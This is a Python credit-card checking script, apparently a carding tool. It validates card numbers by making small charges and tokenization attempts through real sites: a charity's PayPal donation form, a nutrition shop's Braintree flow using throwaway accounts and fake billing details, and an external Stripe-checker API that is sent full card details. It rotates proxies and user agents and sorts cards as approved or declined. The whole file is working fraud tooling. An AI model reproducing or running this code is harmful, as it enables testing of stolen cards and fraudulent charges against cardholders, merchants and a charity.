#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import requests
import json
import re
import random
import base64
import time
import urllib3
from requests_toolbelt import MultipartEncoder

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# ============================================================================
# Helper: Format proxy for requests
# ============================================================================
def format_proxy(proxy):
    if not proxy:
        return None
    parts = proxy.split(':')
    if len(parts) == 2:
        url = f"http://{parts[0]}:{parts[1]}"
        return {'http': url, 'https': url}
    elif len(parts) == 4:
        url = f"http://{parts[2]}:{parts[3]}@{parts[0]}:{parts[1]}"
        return {'http': url, 'https': url}
    return None

# ============================================================================
# Simple random user‑agent generator (no external dependency)
# ============================================================================
def generate_user_agent():
    ua_list = [
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Safari/605.1.15",
        "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
        "Mozilla/5.0 (iPhone; CPU iPhone OS 16_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.0 Mobile/15E148 Safari/604.1",
        "Mozilla/5.0 (Linux; Android 12; SM-G998B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Mobile Safari/537.36",
        "Mozilla/5.0 (Windows NT 10.0; rv:109.0) Gecko/20100101 Firefox/120.0",
        "Mozilla/5.0 (iPad; CPU OS 15_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.0 Mobile/15E148 Safari/604.1",
    ]
    return random.choice(ua_list)

# ============================================================================
# Global constants for compatibility
# ============================================================================
PAYPAL_SITE = "http://bavashdesigns.com"
PAYPAL_AMOUNT = 0.05

# ============================================================================
# WORKING PAYPAL GATE (uses 2africa.org)
# ============================================================================
def check_paypal_working(cc, proxy=None):
    """
    Checks a card on 2africa.org PayPal donation.
    Returns (message, status) where status is 'APPROVED' or 'DECLINED' or 'ERROR'.
    """
    try:
        cc = cc.strip()
        parts = cc.split('|')
        if len(parts) < 4:
            return "Invalid format", "ERROR"
        cc_num, mm, yy, cvv = parts[0], parts[1], parts[2], parts[3]
        if len(yy) == 2:
            yy = '20' + yy

        SITE_URL = 'https://2africa.org/donate-now/'
        BASE_URL = 'https://2africa.org'
        UA = generate_user_agent()

        def extract_data():
            s = requests.Session()
            s.verify = False
            if proxy:
                s.proxies.update(format_proxy(proxy))
            headers = {'User-Agent': UA, 'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8'}
            r = s.get(SITE_URL, headers=headers, timeout=30)
            html = r.text

            if 'givewp-route=donation-form-view' in html and 'givewp-route-signature' not in html:
                fid = re.search(r'form-id[=]+(\d+)', html)
                if fid:
                    iframe = f'{BASE_URL}/?givewp-route=donation-form-view&form-id={fid.group(1)}'
                    r2 = s.get(iframe, headers=headers, timeout=30)
                    html = r2.text

            # Try multiple patterns for form fields
            fp = re.search(r'name="give-form-id-prefix" value="(.*?)"', html)
            if not fp:
                fp = re.search(r'name="give-form-id-prefix"\s+value="([^"]+)"', html)
            fi = re.search(r'name="give-form-id" value="(.*?)"', html)
            if not fi:
                fi = re.search(r'name="give-form-id"\s+value="([^"]+)"', html)
            nc = re.search(r'name="give-form-hash" value="(.*?)"', html)
            if not nc:
                nc = re.search(r'name="give-form-hash"\s+value="([^"]+)"', html)
            if not all([fp, fi, nc]):
                return None

            enc = re.search(r'"data-client-token":"(.*?)"', html)
            if not enc:
                enc = re.search(r'data-client-token="([^"]+)"', html)
            if not enc:
                return None
            dec = base64.b64decode(enc.group(1)).decode('utf-8')
            au = re.search(r'"accessToken":"(.*?)"', dec)
            if not au:
                return None
            return {
                'fp': fp.group(1), 'fi': fi.group(1), 'nc': nc.group(1),
                'at': au.group(1), 'session': s
            }

        d = extract_data()
        if not d:
            return "Failed to extract form data", "ERROR"

        s = d['session']
        fp, fi, nc, at = d['fp'], d['fi'], d['nc'], d['at']

        email = f'drgam{random.randint(100,999)}@gmail.com'
        first_name = 'DRGAM'
        last_name = 'rights and'

        # Step 1: initial donation setup
        headers = {
            'origin': BASE_URL, 'referer': SITE_URL,
            'sec-ch-ua': '"Chromium";v="137", "Not/A)Brand";v="24"',
            'sec-ch-ua-mobile': '?1', 'sec-ch-ua-platform': '"Android"',
            'sec-fetch-dest': 'empty', 'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-origin',
            'user-agent': UA, 'x-requested-with': 'XMLHttpRequest',
        }
        data = {
            'give-honeypot': '', 'give-form-id-prefix': fp, 'give-form-id': fi,
            'give-form-title': '', 'give-current-url': SITE_URL,
            'give-form-url': SITE_URL, 'give-form-minimum': '1.00',
            'give-form-maximum': '999999.99', 'give-form-hash': nc,
            'give-price-id': '3', 'give-recurring-logged-in-only': '',
            'give-logged-in-only': '1', '_give_is_donation_recurring': '0',
            'give_recurring_donation_details': '{"give_recurring_option":"yes_donor"}',
            'give-amount': '1.00', 'give_stripe_payment_method': '',
            'payment-mode': 'paypal-commerce', 'give_first': first_name,
            'give_last': last_name, 'give_email': email,
            'card_name': 'drgam', 'card_exp_month': '', 'card_exp_year': '',
            'give_action': 'purchase', 'give-gateway': 'paypal-commerce',
            'action': 'give_process_donation', 'give_ajax': 'true',
        }
        s.post(f'{BASE_URL}/wp-admin/admin-ajax.php', headers=headers, data=data, timeout=30)

        # Step 2: create order
        mp = MultipartEncoder(fields={
            'give-honeypot': (None, ''), 'give-form-id-prefix': (None, fp),
            'give-form-id': (None, fi), 'give-form-title': (None, ''),
            'give-current-url': (None, SITE_URL), 'give-form-url': (None, SITE_URL),
            'give-form-minimum': (None, '1.00'), 'give-form-maximum': (None, '999999.99'),
            'give-form-hash': (None, nc), 'give-price-id': (None, '3'),
            'give-recurring-logged-in-only': (None, ''), 'give-logged-in-only': (None, '1'),
            '_give_is_donation_recurring': (None, '0'),
            'give_recurring_donation_details': (None, '{"give_recurring_option":"yes_donor"}'),
            'give-amount': (None, '1.00'), 'give_stripe_payment_method': (None, ''),
            'payment-mode': (None, 'paypal-commerce'), 'give_first': (None, first_name),
            'give_last': (None, last_name), 'give_email': (None, email),
            'card_name': (None, 'drgam'), 'card_exp_month': (None, ''),
            'card_exp_year': (None, ''), 'give-gateway': (None, 'paypal-commerce'),
        })
        headers['content-type'] = mp.content_type
        r1 = s.post(f'{BASE_URL}/wp-admin/admin-ajax.php?action=give_paypal_commerce_create_order',
                    headers=headers, data=mp, timeout=30)
        try:
            tok = r1.json()['data']['id']
        except:
            return f"Order creation failed: {r1.text[:150]}", "ERROR"

        # Step 3: confirm payment source with PayPal
        pp_headers = {
            'authority': 'cors.api.paypal.com', 'accept': '*/*',
            'accept-language': 'ar-EG,ar;q=0.9,en-EG;q=0.8,en-US;q=0.7,en;q=0.6',
            'authorization': f'Bearer {at}',
            'braintree-sdk-version': '3.32.0-payments-sdk-dev',
            'content-type': 'application/json',
            'origin': 'https://assets.braintreegateway.com',
            'referer': 'https://assets.braintreegateway.com/',
            'paypal-client-metadata-id': '7d9928a1f3f1fbc240cfd71a3eefe835',
            'sec-ch-ua': '"Chromium";v="139", "Not;A=Brand";v="99"',
            'sec-ch-ua-mobile': '?1', 'sec-ch-ua-platform': '"Android"',
            'sec-fetch-dest': 'empty', 'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'cross-site', 'user-agent': UA,
        }
        json_data = {
            'payment_source': {
                'card': {
                    'number': cc_num,
                    'expiry': f'{yy}-{mm}',
                    'security_code': cvv,
                    'attributes': {'verification': {'method': 'SCA_WHEN_REQUIRED'}}
                }
            },
            'application_context': {'vault': False},
        }
        s.post(f'https://cors.api.paypal.com/v2/checkout/orders/{tok}/confirm-payment-source',
               headers=pp_headers, json=json_data, timeout=30)

        # Step 4: approve order
        mp2 = MultipartEncoder(fields={
            'give-honeypot': (None, ''), 'give-form-id-prefix': (None, fp),
            'give-form-id': (None, fi), 'give-form-title': (None, ''),
            'give-current-url': (None, SITE_URL), 'give-form-url': (None, SITE_URL),
            'give-form-minimum': (None, '1.00'), 'give-form-maximum': (None, '999999.99'),
            'give-form-hash': (None, nc), 'give-price-id': (None, '3'),
            'give-recurring-logged-in-only': (None, ''), 'give-logged-in-only': (None, '1'),
            '_give_is_donation_recurring': (None, '0'),
            'give_recurring_donation_details': (None, '{"give_recurring_option":"yes_donor"}'),
            'give-amount': (None, '1.00'), 'give_stripe_payment_method': (None, ''),
            'payment-mode': (None, 'paypal-commerce'), 'give_first': (None, first_name),
            'give_last': (None, last_name), 'give_email': (None, email),
            'card_name': (None, 'drgam'), 'card_exp_month': (None, ''),
            'card_exp_year': (None, ''), 'give-gateway': (None, 'paypal-commerce'),
        })
        headers['content-type'] = mp2.content_type
        r2 = s.post(f'{BASE_URL}/wp-admin/admin-ajax.php?action=give_paypal_commerce_approve_order&order=' + tok,
                    headers=headers, data=mp2, timeout=30)
        txt = r2.text

        # Parse response
        if 'true' in txt or 'sucsess' in txt or 'COMPLETED' in txt:
            return "Charged $1.00", "APPROVED"
        decline_keywords = [
            'DO_NOT_HONOR', 'ACCOUNT_CLOSED', 'PAYER_ACCOUNT_LOCKED_OR_CLOSED', 'LOST_OR_STOLEN',
            'CVV2_FAILURE', 'SUSPECTED_FRAUD', 'INVALID_ACCOUNT', 'REATTEMPT_NOT_PERMITTED',
            'ACCOUNT_BLOCKED_BY_ISSUER', 'ORDER_NOT_APPROVED', 'PICKUP_CARD_SPECIAL_CONDITIONS',
            'PAYER_CANNOT_PAY', 'INSUFFICIENT_FUNDS', 'GENERIC_DECLINE', 'COMPLIANCE_VIOLATION',
            'TRANSACTION_NOT_PERMITTED', 'PAYMENT_DENIED', 'INVALID_TRANSACTION',
            'RESTRICTED_OR_INACTIVE_ACCOUNT', 'SECURITY_VIOLATION', 'DECLINED_DUE_TO_UPDATED_ACCOUNT',
            'INVALID_OR_RESTRICTED_CARD', 'EXPIRED_CARD', 'CRYPTOGRAPHIC_FAILURE',
            'TRANSACTION_CANNOT_BE_COMPLETED', 'DECLINED_PLEASE_RETRY', 'TX_ATTEMPTS_EXCEED_LIMIT'
        ]
        for kw in decline_keywords:
            if kw in txt:
                return f"Declined: {kw}", "DECLINED"
        return f"Unknown response: {txt[:200]}", "ERROR"

    except Exception as e:
        return f"Exception: {str(e)[:100]}", "ERROR"

check_paypal_fixed = check_paypal_working
check_paypal_general = check_paypal_working

# ============================================================================
# STRIPE GATE (External API) - works via API
# ============================================================================
STRIPE_SITE = "newzealandtrends.com"
STRIPE_API_URL = "https://stripe-checker-production-e6a0.up.railway.app/v1/stripe/auth"

def check_stripe_api(cc, proxy=None):
    """
    Check a card using the external Stripe API.
    Returns (message, status).
    """
    try:
        cc = cc.strip()
        parts = cc.split('|')
        if len(parts) < 4:
            return "Invalid format", "ERROR"
        cc_num, mm, yy, cvv = parts[0], parts[1], parts[2], parts[3]

        import urllib.parse
        param_string = f"site={STRIPE_SITE}&cc={cc_num}%7C{mm}%7C{yy}%7C{cvv}"
        url = f"{STRIPE_API_URL}/{param_string}"

        session = requests.Session()
        if proxy:
            session.proxies.update(format_proxy(proxy))

        response = session.get(url, timeout=30, verify=False)
        response.raise_for_status()
        data = response.json()

        result = data.get('result', '').lower()
        if 'charged' in result or 'approved' in result or 'success' in result:
            return result, "APPROVED"
        else:
            return result, "DECLINED"

    except requests.exceptions.Timeout:
        return "Timeout", "ERROR"
    except requests.exceptions.RequestException as e:
        return f"Request error: {str(e)}", "ERROR"
    except json.JSONDecodeError:
        return "Invalid API response", "ERROR"
    except Exception as e:
        return f"Exception: {str(e)[:100]}", "ERROR"

# ============================================================================
# BRAINTREE GATE (Local site - fixed)
# ============================================================================
def check_braintree(cc, proxy=None):
    """
    Braintree tokenization gate using shop.trifectanutrition.com.
    Returns (message, status).
    """
    try:
        cc = cc.strip()
        parts = re.split(r'[ |/]', cc)
        if len(parts) < 4:
            return "Invalid format", "ERROR"
        c = parts[0]
        mm = parts[1]
        ex = parts[2]
        cvc = parts[3]
        # Normalize year
        if len(ex) == 2:
            yy = ex
        elif len(ex) == 4:
            yy = ex[2:]
        else:
            yy = ex
        if len(yy) == 4:
            yy = yy[2:]
        if len(yy) != 2:
            yy = yy[-2:]

        # Create random user
        username = ''.join(random.choices('abcdefghijklmnopqrstuvwxyz0123456789', k=8))
        email = f"{username}@gmail.com"
        user_agent = generate_user_agent()

        session = requests.Session()
        if proxy:
            session.proxies.update(format_proxy(proxy))
        session.verify = False

        # 1. Create account
        headers = {'User-Agent': user_agent}
        json_data = {'email': email, 'password': email}
        session.post('https://shop.trifectanutrition.com/wp-json/tf/v1/fb/user/create/email',
                     headers=headers, json=json_data, timeout=30)

        # 2. Get address nonce – the nonce may be in a hidden input or in a script
        resp = session.get('https://shop.trifectanutrition.com/my-account/edit-address/billing/',
                           headers=headers, timeout=30)
        html = resp.text
        address_nonce = None
        # Try multiple patterns
        patterns = [
            r'name="woocommerce-edit-address-nonce" value="(.*?)"',
            r'name="woocommerce-edit-address-nonce"\s+value="([^"]+)"',
            r'woocommerce-edit-address-nonce" value="([^"]+)"',
        ]
        for pat in patterns:
            match = re.search(pat, html)
            if match:
                address_nonce = match.group(1)
                break
        if not address_nonce:
            return "Failed to get address nonce", "ERROR"

        # 3. Set billing address
        data = {
            'billing_first_name': 'Hussein',
            'billing_last_name': 'Alfuraijii',
            'billing_company': '',
            'billing_country': 'CA',
            'billing_address_1': '3480 Granada Ave',
            'billing_city': 'Los Angeles',
            'billing_state': 'AB',
            'billing_postcode': 'T7S 1E8',
            'billing_phone': '3153153152',
            'billing_email': email,
            'save_address': 'Save address',
            'woocommerce-edit-address-nonce': address_nonce,
            '_wp_http_referer': '/my-account/edit-address/billing/',
            'action': 'edit_address',
        }
        session.post('https://shop.trifectanutrition.com/my-account/edit-address/billing/',
                     headers=headers, data=data, timeout=30)

        # 4. Get payment page nonces
        resp = session.get('https://shop.trifectanutrition.com/my-account/add-payment-method/',
                           headers=headers, timeout=30)
        html = resp.text
        payment_nonce = None
        for pat in patterns:  # same pattern for payment nonce
            match = re.search(pat.replace('edit-address', 'add-payment-method'), html)
            if match:
                payment_nonce = match.group(1)
                break
        if not payment_nonce:
            # Try more generic pattern
            match = re.search(r'name="woocommerce-add-payment-method-nonce" value="([^"]+)"', html)
            if match:
                payment_nonce = match.group(1)
        if not payment_nonce:
            return "Failed to get payment nonce", "ERROR"

        client_token_nonce = None
        match = re.search(r'client_token_nonce":"([^"]+)"', html)
        if match:
            client_token_nonce = match.group(1)
        if not client_token_nonce:
            match = re.search(r'client_token_nonce["\']:\s*["\']([^"\']+)["\']', html)
            if match:
                client_token_nonce = match.group(1)
        if not client_token_nonce:
            return "Failed to get client token nonce", "ERROR"

        # 5. Get Braintree client token
        data = {'action': 'wc_braintree_credit_card_get_client_token', 'nonce': client_token_nonce}
        resp = session.post('https://shop.trifectanutrition.com/wordpress/wp-admin/admin-ajax.php',
                            headers=headers, data=data, timeout=30)
        enc = resp.json()['data']
        dec = base64.b64decode(enc).decode('utf-8')
        auth_fingerprint = re.findall(r'"authorizationFingerprint":"(.*?)"', dec)[0]

        # 6. Tokenize card
        braintree_headers = {
            'authority': 'payments.braintree-api.com',
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
            'accept-language': 'en-US,en;q=0.9',
            'authorization': f'Bearer {auth_fingerprint}',
            'braintree-version': '2018-05-10',
            'content-type': 'application/json',
            'origin': 'https://assets.braintreegateway.com',
            'referer': 'https://assets.braintreegateway.com/',
            'user-agent': user_agent,
        }
        json_data = {
            'clientSdkMetadata': {
                'source': 'client',
                'integration': 'custom',
                'sessionId': 'ae0e96cd-7aa2-418c-8fba-6627701d117c',
            },
            'query': 'mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) { tokenizeCreditCard(input: $input) { token creditCard { bin brandCode last4 cardholderName expirationMonth expirationYear binData { prepaid healthcare debit durbinRegulated commercial payroll issuingBank countryOfIssuance productId } } } }',
            'variables': {
                'input': {
                    'creditCard': {
                        'number': c,
                        'expirationMonth': mm,
                        'expirationYear': yy,
                        'cvv': cvc,
                    },
                    'options': {'validate': False},
                },
            },
            'operationName': 'TokenizeCreditCard',
        }
        resp = session.post('https://payments.braintree-api.com/graphql',
                            headers=braintree_headers, json=json_data, timeout=30)
        token = resp.json()['data']['tokenizeCreditCard']['token']

        # 7. Add payment method
        data = {
            'payment_method': 'braintree_credit_card',
            'wc-braintree-credit-card-card-type': 'master-card',
            'wc-braintree-credit-card-3d-secure-enabled': '',
            'wc-braintree-credit-card-3d-secure-verified': '',
            'wc-braintree-credit-card-3d-secure-order-total': '0.00',
            'wc_braintree_credit_card_payment_nonce': token,
            'wc_braintree_device_data': '',
            'wc-braintree-credit-card-tokenize-payment-method': 'true',
            'woocommerce-add-payment-method-nonce': payment_nonce,
            '_wp_http_referer': '/my-account/add-payment-method/',
            'woocommerce_add_payment_method': '1',
        }
        resp = session.post('https://shop.trifectanutrition.com/my-account/add-payment-method/',
                            headers=headers, data=data, timeout=30)
        text = resp.text

        # Parse result
        if 'added' in text or 'Payment method successfully added.' in text:
            return "Approved ✅", "APPROVED"
        elif 'Duplicate card exists' in text:
            return "Approved ✅ (Duplicate)", "APPROVED"
        elif 'risk_threshold' in text:
            return "RISK: Retry this BIN later.", "DECLINED"
        elif 'Card Issuer Declined CVV' in text:
            return "Declined CVV", "DECLINED"
        elif 'avs' in text or 'cvv' in text:
            return "AVS/CVV Failure", "DECLINED"
        else:
            match = re.search(r'Reason: (.+?)\s*</li>', text)
            if match:
                reason = match.group(1)
                return f"Declined: {reason}", "DECLINED"
            return "Unknown error", "ERROR"

    except Exception as e:
        return f"Exception: {str(e)[:100]}", "ERROR"

# ============================================================================
# The following gates are disabled because the Onyx API is not working.
# They are replaced with dummy functions that return an error.
# ============================================================================
def _onyx_unavailable(gate_name):
    return lambda cc, proxy=None: (f"{gate_name} unavailable (Onyx API down)", "ERROR")

check_chaos = _onyx_unavailable("Chaos")
check_adyen = _onyx_unavailable("Adyen")
check_app_auth = _onyx_unavailable("App Auth")
check_payflow = _onyx_unavailable("Payflow")
check_random = _onyx_unavailable("Random")
check_shopify_onyx = _onyx_unavailable("Shopify")
check_skrill = _onyx_unavailable("Skrill")
check_stripe_onyx = _onyx_unavailable("Stripe")
check_arcenus = _onyx_unavailable("Arcenus")
check_random_stripe = _onyx_unavailable("Random Stripe")
check_razorpay = _onyx_unavailable("RazorPay")
check_payu = _onyx_unavailable("PayU")
check_sk_gateway = _onyx_unavailable("SK Gateway")
check_paypal_onyx = _onyx_unavailable("PayPal")
